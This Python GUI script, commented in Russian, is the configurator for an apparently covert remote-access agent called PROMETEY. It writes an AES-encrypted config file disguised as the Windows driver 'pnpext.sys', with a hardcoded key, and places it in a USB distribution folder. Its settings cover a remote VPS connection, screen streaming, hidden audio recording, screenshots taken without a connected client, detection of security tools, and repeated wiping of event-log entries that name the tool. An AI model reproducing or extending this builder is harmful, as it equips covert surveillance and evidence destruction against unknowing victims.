#!/usr/bin/env python3
"""
PROMETEY — Конфигуратор хоста  (pnpext.sys editor)
═══════════════════════════════════════════════════════
GUI-инструмент для создания и редактирования
зашифрованного файла конфигурации pnpext.sys.

Требования: Python 3.8+
Зависимость: pip install cryptography
Запуск:      python pnpext_config_editor.py
"""

import tkinter as tk
from tkinter import ttk, filedialog, messagebox
import json, os, sys

# ─────────────────────────────────────────────────────────────────────────────
#  Криптография  (AES-256-CBC, PKCS7-padding)
# ─────────────────────────────────────────────────────────────────────────────
try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import padding as _pad
    _CRYPTO = True
except ImportError:
    _CRYPTO = False

# Ключ и IV должны совпадать с g_aes_key / g_aes_iv в main.cpp
_KEY = bytes([
    0x3A,0x7F,0x21,0x94,0xC5,0xD2,0x6B,0x11,0x8E,0x4C,0xF9,0x53,0x07,0xB8,0xDA,0x62,
    0x19,0xAF,0x33,0xE4,0x5D,0x70,0x88,0x9B,0xC1,0x2E,0x47,0x6A,0x8D,0x90,0xAB,0xCD,
])
_IV = bytes([
    0x12,0x34,0x56,0x78,0x9A,0xBC,0xDE,0xF0,0x0F,0x1E,0x2D,0x3C,0x4B,0x5A,0x69,0x78,
])


def _encrypt(data: bytes) -> bytes:
    p = _pad.PKCS7(128).padder()
    padded = p.update(data) + p.finalize()
    enc = Cipher(algorithms.AES(_KEY), modes.CBC(_IV)).encryptor()
    return enc.update(padded) + enc.finalize()


def _decrypt(data: bytes) -> bytes:
    dec = Cipher(algorithms.AES(_KEY), modes.CBC(_IV)).decryptor()
    padded = dec.update(data) + dec.finalize()
    u = _pad.PKCS7(128).unpadder()
    return u.update(padded) + u.finalize()


# ─────────────────────────────────────────────────────────────────────────────
#  Пути
# ─────────────────────────────────────────────────────────────────────────────
_HERE = os.path.dirname(os.path.abspath(sys.argv[0]))


def _find_root() -> str:
    """Корень проекта независимо от места запуска скрипта."""
    h = _HERE
    # Запущен из release/HOST/ — поднимаемся на 2 уровня вверх
    if os.path.basename(h).upper() == "HOST":
        up = os.path.dirname(h)
        if os.path.basename(up).lower() == "release":
            return os.path.dirname(up)
    return h


ROOT      = _find_root()
_TEMPLATE = os.path.join(ROOT, "host_config.json.template")

_DEFAULT_DESTS = [
    os.path.join(ROOT, "dist",    "usb",  "pnpext.sys"),
    os.path.join(ROOT, "release", "HOST", "pnpext.sys"),
]


def _rel(path: str) -> str:
    try:
        return os.path.relpath(path, ROOT)
    except ValueError:
        return path


# ─────────────────────────────────────────────────────────────────────────────
#  Описание полей конфига
#  (ключ, метка, тип, значение_по_умолчанию, [варианты_для_choice])
# ─────────────────────────────────────────────────────────────────────────────
_FIELDS = [
    # Подключение
    ("server",      "Адрес ВПС (IP или домен)",        "str",    ""),
    ("port",        "Порт",                              "int",    443),
    ("use_tls",     "Шифрование TLS  (WSS / HTTPS)",    "bool",   True),
    ("token",       "Токен комнаты  (room_token)",       "str",    ""),
    ("password",    "Пароль",                            "pwd",    ""),
    # STUN / TURN
    ("stun_server", "STUN-сервер",                       "str",    ""),
    ("turn_server", "TURN-сервер",                       "str",    ""),
    # Видео
    ("codec",             "Кодек видео",                 "choice", "h264",  ["h264","h265","vp8","vp9"]),
    ("quality",           "Качество (0–100)",             "int",    80),
    ("fps",               "Кадров в секунду",             "int",    30),
    ("scale",             "Масштаб экрана (%)",           "int",    100),
    ("bitrate",           "Битрейт (кбит/с)",            "int",    2000),
    ("screen_connections","Потоков экрана",               "int",    1),
    ("file_connections",  "Потоков файлов",               "int",    4),
    ("log_level",         "Уровень логов",                "choice", "INFO",  ["DEBUG","INFO","WARNING","ERROR"]),
    # Аудио
    ("audio_enabled",         "Включить аудио",            "bool",   False),
    ("audio_segment_duration","Сегмент записи (сек)",      "int",    30),
    ("audio_sample_rate",     "Частота дискретизации (Гц)","int",    16000),
    ("audio_bitrate",         "Битрейт аудио (кбит/с)",   "int",    128),
    ("audio_channels",        "Каналов (1=моно  2=стерео)","int",    1),
    ("audio_gain",            "Усиление (%)",               "int",    100),
    ("audio_denoise",         "Шумоподавление",             "bool",   True),
    ("audio_normalize",       "Нормализация уровня",        "bool",   True),
    ("audio_hum_filter",      "Фильтр гула (50 или 60 Гц)","int",    50),
    # Скриншоты
    ("screenshot_enabled",  "Включить скриншоты",           "bool",   False),
    ("screenshot_interval", "Интервал (сек)",               "int",    10),
    ("screenshot_quality",  "Качество (%)",                 "int",    75),
    ("screenshot_scale",    "Масштаб (%)",                  "int",    50),
    ("screenshot_always",   "Снимать всегда (без клиента)", "bool",   True),
    ("screenshot_apps",     "Только для приложений (пусто=все)", "str", ""),
    # Безопасность
    ("threat_scan_enabled",  "Сканирование угроз",          "bool",   True),
    ("threat_auto_pause",    "Авто-пауза при угрозе",       "bool",   False),
    ("evtlog_clean_patterns","Паттерны очистки журнала",    "str",    "pnpext,pnpext.dll"),
    ("evtlog_clean_interval","Интервал очистки (сек)",      "int",    120),
    ("evtlog_clean_mode",    "Режим очистки",               "choice", "once", ["once","loop"]),
]

_FI = {f[0]: f for f in _FIELDS}   # быстрый доступ по ключу

_TABS = [
    ("  Подключение  ",  ["server","port","use_tls","token","password"]),
    ("  STUN / TURN  ",  ["stun_server","turn_server"]),
    ("  Видео  ",        ["codec","quality","fps","scale","bitrate",
                          "screen_connections","file_connections","log_level"]),
    ("  Аудио  ",        ["audio_enabled","audio_segment_duration","audio_sample_rate",
                          "audio_bitrate","audio_channels","audio_gain",
                          "audio_denoise","audio_normalize","audio_hum_filter"]),
    ("  Скриншоты  ",    ["screenshot_enabled","screenshot_interval","screenshot_quality",
                          "screenshot_scale","screenshot_always","screenshot_apps"]),
    ("  Безопасность  ", ["threat_scan_enabled","threat_auto_pause",
                          "evtlog_clean_patterns","evtlog_clean_interval","evtlog_clean_mode"]),
]


# ─────────────────────────────────────────────────────────────────────────────
#  Главное окно
# ─────────────────────────────────────────────────────────────────────────────
class App(tk.Tk):

    def __init__(self):
        super().__init__()
        self.title("PROMETEY — Конфигуратор хоста")
        self.minsize(580, 520)
        self.resizable(True, False)
        self._vars: dict[str, tk.Variable] = {}
        self._nb: ttk.Notebook | None = None
        self._dest_vars: list[tuple[tk.BooleanVar, str]] = []
        self._custom_en   = tk.BooleanVar(value=False)
        self._custom_path = tk.StringVar()
        self._status      = tk.StringVar(value="Готов к работе")
        self._setup_style()
        self._build_ui()
        self._load_template_silent()

    # ── Стиль ─────────────────────────────────────────────────────────────────
    def _setup_style(self):
        s = ttk.Style(self)
        for theme in ("vista", "xpnative", "clam"):
            try:
                s.theme_use(theme)
                break
            except Exception:
                pass
        font9 = ("Segoe UI", 9)
        s.configure("TNotebook.Tab", padding=[12, 6], font=font9)
        s.configure("TLabel",      font=font9)
        s.configure("TEntry",      font=font9)
        s.configure("TCheckbutton",font=font9)
        s.configure("TCombobox",   font=font9)
        s.configure("TButton",     font=font9)
        s.configure("TLabelframe.Label", font=("Segoe UI", 9, "bold"))

    # ── Построение интерфейса ─────────────────────────────────────────────────
    def _build_ui(self):
        # ── Заголовок ──
        hdr = tk.Frame(self, bg="#16213e", pady=12)
        hdr.pack(fill="x")
        tk.Label(hdr, text="  PROMETEY — Конфигуратор хоста",
                 font=("Segoe UI", 13, "bold"),
                 fg="white", bg="#16213e", anchor="w").pack(fill="x", padx=15)
        tk.Label(hdr,
                 text="  Создание и редактирование зашифрованного конфига  pnpext.sys",
                 font=("Segoe UI", 9), fg="#8899bb", bg="#16213e",
                 anchor="w").pack(fill="x", padx=15)

        # ── Вкладки ──
        nb = ttk.Notebook(self)
        nb.pack(fill="both", expand=True, padx=10, pady=(10, 4))
        self._nb = nb
        for tab_label, keys in _TABS:
            frm = ttk.Frame(nb, padding=(14, 10))
            nb.add(frm, text=tab_label)
            self._populate_tab(frm, keys)

        # ── Нижняя панель ──
        bot = ttk.Frame(self, padding=(10, 2, 10, 8))
        bot.pack(fill="x")

        # Кнопки шаблона
        r1 = ttk.Frame(bot)
        r1.pack(fill="x", pady=(0, 4))
        ttk.Button(r1, text="Загрузить шаблон",   command=self._load_template).pack(side="left", padx=(0, 4))
        ttk.Button(r1, text="Сохранить шаблон",   command=self._save_template).pack(side="left", padx=(0, 4))
        ttk.Button(r1, text="Открыть pnpext.sys…", command=self._open_sys).pack(side="right")

        ttk.Separator(bot).pack(fill="x", pady=(4, 6))

        # Назначения
        dest_lf = ttk.LabelFrame(bot, text="  Записать pnpext.sys в:", padding=(8, 4))
        dest_lf.pack(fill="x", pady=(0, 6))

        for path in _DEFAULT_DESTS:
            bv = tk.BooleanVar(value=os.path.isdir(os.path.dirname(path)))
            ttk.Checkbutton(dest_lf, text=_rel(path), variable=bv).pack(anchor="w")
            self._dest_vars.append((bv, path))

        # Дополнительный путь
        cr = ttk.Frame(dest_lf)
        cr.pack(fill="x", pady=(4, 0))
        ttk.Checkbutton(cr, text="Другое:", variable=self._custom_en).pack(side="left")
        ttk.Entry(cr, textvariable=self._custom_path, width=35).pack(side="left", padx=4)
        ttk.Button(cr, text="Обзор…", command=self._browse).pack(side="left")

        # Кнопка генерации
        gen = tk.Button(
            bot,
            text="  ГЕНЕРИРОВАТЬ  pnpext.sys  ",
            font=("Segoe UI", 11, "bold"),
            bg="#27ae60", fg="white",
            activebackground="#2ecc71", activeforeground="white",
            relief="flat", bd=0, padx=20, pady=11,
            cursor="hand2",
            command=self._generate,
        )
        gen.pack(fill="x", pady=(0, 4))
        gen.bind("<Enter>", lambda _: gen.config(bg="#2ecc71"))
        gen.bind("<Leave>", lambda _: gen.config(bg="#27ae60"))

        # Статус-строка
        tk.Label(self, textvariable=self._status, anchor="w",
                 bg="#ecf0f1", relief="sunken",
                 font=("Segoe UI", 8), padx=6, pady=3).pack(fill="x", side="bottom")

    # ── Наполнение вкладки ────────────────────────────────────────────────────
    def _populate_tab(self, parent: ttk.Frame, keys: list):
        for key in keys:
            meta  = _FI[key]
            _k, label, ftype, default, *rest = meta
            choices = rest[0] if rest else []

            row = ttk.Frame(parent)
            row.pack(fill="x", pady=3)

            ttk.Label(row, text=label + ":", width=32, anchor="w").pack(side="left")

            if ftype == "bool":
                v = tk.BooleanVar(value=default)
                ttk.Checkbutton(row, variable=v).pack(side="left")

            elif ftype == "choice":
                v = tk.StringVar(value=default)
                ttk.Combobox(row, textvariable=v, values=choices,
                             state="readonly", width=16).pack(side="left")

            elif ftype == "pwd":
                v = tk.StringVar(value=default)
                entry = ttk.Entry(row, textvariable=v, show="●", width=28)
                entry.pack(side="left", padx=(0, 6))
                show_var = tk.BooleanVar(value=False)
                def _make_toggle(e=entry, sv=show_var):
                    def _toggle():
                        e.config(show="" if sv.get() else "●")
                    return _toggle
                ttk.Checkbutton(row, text="Показать", variable=show_var,
                                command=_make_toggle()).pack(side="left")

            elif ftype == "int":
                v = tk.StringVar(value=str(default))
                ttk.Entry(row, textvariable=v, width=12).pack(side="left")

            else:  # str
                v = tk.StringVar(value=str(default))
                width = 40 if key in ("server","stun_server","turn_server",
                                      "evtlog_clean_patterns") else 32
                ttk.Entry(row, textvariable=v, width=width).pack(side="left")

            self._vars[key] = v

        # Кнопка авто-заполнения STUN/TURN на вкладке «Подключение»
        if "server" in keys:
            hint = ttk.Frame(parent)
            hint.pack(fill="x", pady=(10, 0))
            ttk.Button(
                hint,
                text="Авто-заполнить STUN/TURN по адресу ВПС",
                command=self._autofill_stun,
            ).pack(side="left")
            ttk.Label(hint, text=" (вкладка STUN/TURN)",
                      font=("Segoe UI", 8), foreground="#666").pack(side="left")

    # ── Авто-заполнение STUN/TURN ─────────────────────────────────────────────
    def _autofill_stun(self):
        ip  = self._vars["server"].get().strip()
        pwd = self._vars["password"].get().strip()
        if not ip:
            messagebox.showwarning("Подсказка", "Сначала укажите адрес ВПС")
            return
        self._vars["stun_server"].set(f"stun:{ip}:3478")
        turn_pwd = pwd if pwd else "ПАРОЛЬ"
        self._vars["turn_server"].set(f"turn:rdp:{turn_pwd}@{ip}:3478")
        self._status.set(f"✓ STUN/TURN заполнены по адресу: {ip}")

    # ── Сбор значений в dict ──────────────────────────────────────────────────
    def _collect(self) -> dict:
        cfg = {}
        for meta in _FIELDS:
            key, _lbl, ftype, default, *_ = meta
            v = self._vars.get(key)
            raw = v.get() if v is not None else default
            if ftype == "bool":
                cfg[key] = bool(raw)
            elif ftype == "int":
                try:
                    cfg[key] = int(raw)
                except (ValueError, TypeError):
                    cfg[key] = int(default)
            else:
                cfg[key] = str(raw)
        return cfg

    # ── Применить dict → UI ───────────────────────────────────────────────────
    def _apply(self, cfg: dict):
        for meta in _FIELDS:
            key, _lbl, ftype, default, *_ = meta
            v = self._vars.get(key)
            if v is None or key not in cfg:
                continue
            val = cfg[key]
            if ftype == "bool":
                v.set(bool(val))
            elif ftype == "int":
                v.set(str(val))
            else:
                v.set(str(val))

    # ── Загрузить шаблон (тихо при старте) ───────────────────────────────────
    def _load_template_silent(self):
        if os.path.exists(_TEMPLATE):
            try:
                with open(_TEMPLATE, "r", encoding="utf-8") as f:
                    self._apply(json.load(f))
                self._status.set(f"✓ Загружен: {_rel(_TEMPLATE)}")
            except Exception:
                pass

    # ── Загрузить шаблон (по кнопке) ─────────────────────────────────────────
    def _load_template(self):
        if not os.path.exists(_TEMPLATE):
            messagebox.showwarning("Не найдено",
                f"Файл шаблона не найден:\n{_TEMPLATE}\n\n"
                "Введите настройки вручную и нажмите «Сохранить шаблон».")
            return
        try:
            with open(_TEMPLATE, "r", encoding="utf-8") as f:
                self._apply(json.load(f))
            self._status.set(f"✓ Загружен: {_rel(_TEMPLATE)}")
        except Exception as e:
            messagebox.showerror("Ошибка загрузки", str(e))

    # ── Сохранить шаблон ──────────────────────────────────────────────────────
    def _save_template(self):
        try:
            with open(_TEMPLATE, "w", encoding="utf-8") as f:
                json.dump(self._collect(), f, indent=2, ensure_ascii=False)
            self._status.set(f"✓ Шаблон сохранён: {_rel(_TEMPLATE)}")
        except Exception as e:
            messagebox.showerror("Ошибка сохранения", str(e))

    # ── Открыть и расшифровать существующий pnpext.sys ───────────────────────
    def _open_sys(self):
        if not _CRYPTO:
            messagebox.showwarning("Внимание",
                "Пакет cryptography не установлен — расшифровка недоступна.\n\n"
                "pip install cryptography")
            return
        path = filedialog.askopenfilename(
            title="Открыть pnpext.sys",
            filetypes=[("Encrypted config", "*.sys"), ("All files", "*.*")],
            initialdir=ROOT,
        )
        if not path:
            return
        try:
            with open(path, "rb") as f:
                raw = f.read()
            cfg = json.loads(_decrypt(raw).decode("utf-8"))
            self._apply(cfg)
            self._status.set(f"✓ Расшифрован и загружен: {os.path.basename(path)}")
        except Exception as e:
            messagebox.showerror("Ошибка расшифровки",
                f"Не удалось расшифровать файл:\n{e}")

    # ── Выбор пользовательского пути ─────────────────────────────────────────
    def _browse(self):
        path = filedialog.asksaveasfilename(
            title="Сохранить pnpext.sys как…",
            defaultextension=".sys",
            filetypes=[("Sys files", "*.sys"), ("All files", "*.*")],
            initialfile="pnpext.sys",
        )
        if path:
            self._custom_path.set(path)
            self._custom_en.set(True)

    # ── Генерация pnpext.sys ──────────────────────────────────────────────────
    def _generate(self):
        if not _CRYPTO:
            messagebox.showerror("Ошибка",
                "Пакет cryptography не установлен!\n\n"
                "Выполните в терминале:\n    pip install cryptography\n\n"
                "После установки перезапустите программу.")
            return

        cfg = self._collect()

        # Проверки обязательных полей
        if not cfg.get("server"):
            messagebox.showwarning("Заполните поля", "Укажите адрес ВПС!")
            if self._nb:
                self._nb.select(0)
            return
        if not cfg.get("token"):
            messagebox.showwarning("Заполните поля", "Укажите токен комнаты!")
            if self._nb:
                self._nb.select(0)
            return

        # Список назначений
        dests: list[str] = [p for bv, p in self._dest_vars if bv.get()]
        if self._custom_en.get():
            cp = self._custom_path.get().strip()
            if cp:
                dests.append(cp)

        if not dests:
            messagebox.showwarning("Нет назначения",
                "Выберите хотя бы одно место сохранения!")
            return

        # Шифрование
        try:
            blob = _encrypt(
                json.dumps(cfg, indent=2, ensure_ascii=False).encode("utf-8")
            )
        except Exception as e:
            messagebox.showerror("Ошибка шифрования", str(e))
            return

        # Запись файлов
        ok_list, err_list = [], []
        for path in dests:
            try:
                os.makedirs(os.path.dirname(os.path.abspath(path)), exist_ok=True)
                with open(path, "wb") as f:
                    f.write(blob)
                ok_list.append(path)
            except Exception as e:
                err_list.append(f"{_rel(path)}: {e}")

        if ok_list:
            lines = "\n".join(f"  ✓  {_rel(p)}" for p in ok_list)
            msg = f"pnpext.sys создан  ({len(blob)} байт)\n\n{lines}"
            if err_list:
                msg += "\n\n⚠  Ошибки:\n" + "\n".join(err_list)
            messagebox.showinfo("Готово!", msg)
            self._status.set(
                f"✓ pnpext.sys записан  ({len(blob)} байт, {len(ok_list)} файл(а))"
            )
        else:
            messagebox.showerror("Ошибка записи",
                "Не удалось записать ни одного файла:\n\n" + "\n".join(err_list))


# ─────────────────────────────────────────────────────────────────────────────
#  Точка входа
# ─────────────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    if not _CRYPTO:
        _r = tk.Tk()
        _r.withdraw()
        messagebox.showwarning(
            "Отсутствует зависимость",
            "Пакет cryptography не найден.\n\n"
            "Установите его одной командой:\n"
            "    pip install cryptography\n\n"
            "Функции шифрования и расшифровки pnpext.sys\n"
            "будут недоступны до установки пакета.",
        )
        _r.destroy()
    App().mainloop()
